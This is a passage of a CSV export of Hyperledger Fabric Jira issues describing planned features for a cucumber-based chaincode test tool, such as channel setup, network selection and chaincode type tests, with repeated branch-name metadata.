Logs should include cucumber step output and network setup output.",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017n7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should provide a way for a cucumber scenario to configure a channel,FAB-17385,43974,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:20 AM,21/Jan/20 1:14 AM,28/Oct/23 3:09 AM,21/Jan/20 1:14 AM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,The tool should provide a set of step definitions to allow a cucumber scenario to create a channel on a given network using a definied profile of the network (defined in the network's crypto setup),,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017nf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should be able to start a chaincode on a v2 network channel,FAB-17386,43977,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:28 AM,21/Jan/20 1:14 AM,28/Oct/23 3:09 AM,21/Jan/20 1:14 AM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"The chaincode test tool should provide step definitions for the new chaincode lifecycle to start a chaincode running on a channel. The step should be language agnostic and should use the CLI argument to work out which language to instantiate the chaincode.

The chaincode folder locations should be gathered from the CLI where the directory is given which supplies all the chaincode and includes the overriding of a specific chaincode location

Example:
Have folder containing most of the required chaincodes for the tool in /Users/andrewhurt/testChaincode
Have chaincode ""advanced"" in seperate location and can specify in CLI that specific location",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017nv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The tool should have the ability to run a specific feature set,FAB-17387,43978,,Task,Backlog,FAB,Fabric,software,denyeart,,,High,,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:31 AM,20/Jan/20 11:06 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,To prevent the need to run the whole test suite to debug why one scenario is failing for example the CLI should be able to take tag arguments for use when running cucumber to limit the features to be run.,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017o3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should allow the user to run only specific networks,FAB-17388,43980,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:34 AM,31/Jan/20 7:49 PM,28/Oct/23 3:09 AM,31/Jan/20 7:49 PM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,To prevent the setting up of all networks when a user only wants to check a result against one (e.g. they are failing three-org) the tool should provide a way for a user to specify which networks should be tested against.,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017ob:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should have a feature testing the basic functionality required of chaincode,FAB-17389,43981,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:38 AM,21/Jan/20 1:14 AM,28/Oct/23 3:09 AM,21/Jan/20 1:14 AM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"The chaincode test tool should have a feature to test the following:

1. Can call a simple ""Hello World"" function
2. Can call a function which takes a string parameter
3. Can put to the world state
4. Can read from the world state
5. Can delete from the world state
6. Can cause a transaction to fail on error",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017oj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should test that advanced types can be handled by chaincode,FAB-17390,43982,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:42 AM,21/Jan/20 1:14 AM,28/Oct/23 3:09 AM,21/Jan/20 1:14 AM,,,,,,,,,,,,,,fabric-tools,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"The chaincode test tool should have a feature to test the following:

1. Can pass parameters of type:
    1.1. Int
    1.2. Float
    1.3. Boolean
    1.4. Arrays
    1.5. Objects
    1.6. Objects containing objects
2. Can return parameters of type:
    2.1. Int
    2.2. Float
    2.3. Boolean
    2.4. Arrays
    2.5. Objects
    2.6. Objects containing objects",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017or:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"The chaincode test tool should test a ""real-world"" scenario",FAB-17391,43983,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:46 AM,21/Jan/20 1:14 AM,28/Oct/23 3:09 AM,21/Jan/20 1:14 AM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"The chaincode test tool should test a ""real-world"" scenario to test how a real chaincode would function.

The fabric samples directory has a real world scenario of commercial paper. The chaincode test tool should have a feature file that tests this scenario, this brings the benefit that in order to pass the tests chaincode implementations will create the samples.",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017oz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage 